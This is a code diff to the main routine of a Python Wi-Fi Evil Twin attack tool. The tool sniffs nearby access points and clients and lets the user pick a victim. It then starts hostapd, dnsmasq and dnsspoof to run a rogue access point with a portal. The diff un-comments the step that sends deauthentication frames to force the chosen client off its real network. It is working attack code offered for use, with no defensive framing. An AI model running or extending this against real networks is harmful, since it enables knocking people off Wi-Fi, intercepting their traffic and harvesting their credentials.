@@ -49,7 +49,7 @@ def main():
     sniffer = scan.start_sniff(iface)
 
     # Warm-up phase: 60 seconds
-    warmup = 10
+    warmup = 60
     print(f"Gathering data for {warmup}s before menu...")
     time.sleep(warmup)
 
@@ -85,19 +85,17 @@ def main():
                 print(f"\nSelected AP: {ap_info['SSID']} ({bssid})")
                 print(f"Selected Client: {client_mac}, Packets: {clients[client_mac]['pkt_count']}, Last Seen: {clients[client_mac]['last_seen']}")
 
-                # 3) Bring up hostapd, dnsmasq and dnsspoof
-                # Capture the process handles so you can shut them down cleanly later
-                
+                # 3) Stop sniffing now
+                scan.stop_sniff.set()
+                sniffer.join()
+
+                # 4) Start the Evil Twin attack
                 print("Starting hostapd/dnsmasq/dnsspoof…")
                 procs = attack.start_attack(ap_iface, ap_info)
 
-                # # 4) Deauth the victim until they associate to your Evil AP
-                # attack.deauth_victim({'BSSID': bssid}, client_mac, iface)
+                # 5) Deauth the victim until they associate to your Evil AP
+                attack.deauth_victim({'BSSID': bssid}, client_mac, iface)
                 print(f"Deauthenticating {client_mac} from {bssid}…")
-
-                # 5) Stop sniffing now that the victim is “in”
-                scan.stop_sniff.set()
-                sniffer.join()
 
                 # Keep the main thread alive to serve portal
                 try:
